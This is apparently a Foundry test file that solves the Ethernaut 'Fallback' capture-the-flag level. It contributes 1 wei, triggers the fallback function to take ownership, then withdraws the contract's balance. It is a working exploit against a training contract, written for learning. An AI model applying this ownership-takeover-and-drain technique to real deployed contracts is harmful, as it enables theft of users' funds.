// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Fallback/FallbackFactory.sol"; 
import "../src/Ethernaut.sol"; 

contract FallbackTest is Test {

  //creates a variable ethernaut variable of type Ethernaut
  Ethernaut ethernaut; 
  //instantiate a player with address 100 
  address player = address(100); 

  function setUp() public {
    //creates a new instance of the Ethernaut contract which will register/create/validate new instances of the fallback contract
    ethernaut = new Ethernaut();
    vm.deal(player, 10 ether);  
  }

  function testFallbackHack() public {

    //creates a new instance of the fallback level contract
    FallbackFactory fallbackFactory = new FallbackFactory(); 

    //using the ethernaut instance, we register the fallbackFactory level instance
    ethernaut.registerLevel(fallbackFactory);

    //We start the attack, msg.sender == player 
    vm.startPrank(player);

    //We use the created fallbackFactory level instance and it will return a new instance of the fallback contract
    address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
    Fallback targetLevelAddress = Fallback(payable(levelAddress));

    // We attack now 

    /*
     * Goal of this attack 
     * 1. Gain ownership of the contract
     * 2. withdraw balance to 0 
     * 
     * Hack Procedure
     * 1. Transfer small amount of ether which will trigger the fallback function
     * 2. The fallback function will set the owner to the msg.sender
     * 3. Call withdraw function to drain the contract 
     */

     

     targetLevelAddress.contribute{value: 1 wei}();
     assertEq(targetLevelAddress.contributions(player), 1 wei);

     (bool success, ) = address(address(targetLevelAddress)).call{value: 1 wei}("");
     require(success);

     assertEq(targetLevelAddress.owner(), player);
     
     targetLevelAddress.withdraw();

     // Submit level assuming the hack was successful

     bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 

     vm.stopPrank(); 
     assert(levelSuccessfullyPassed);
  }
  


}

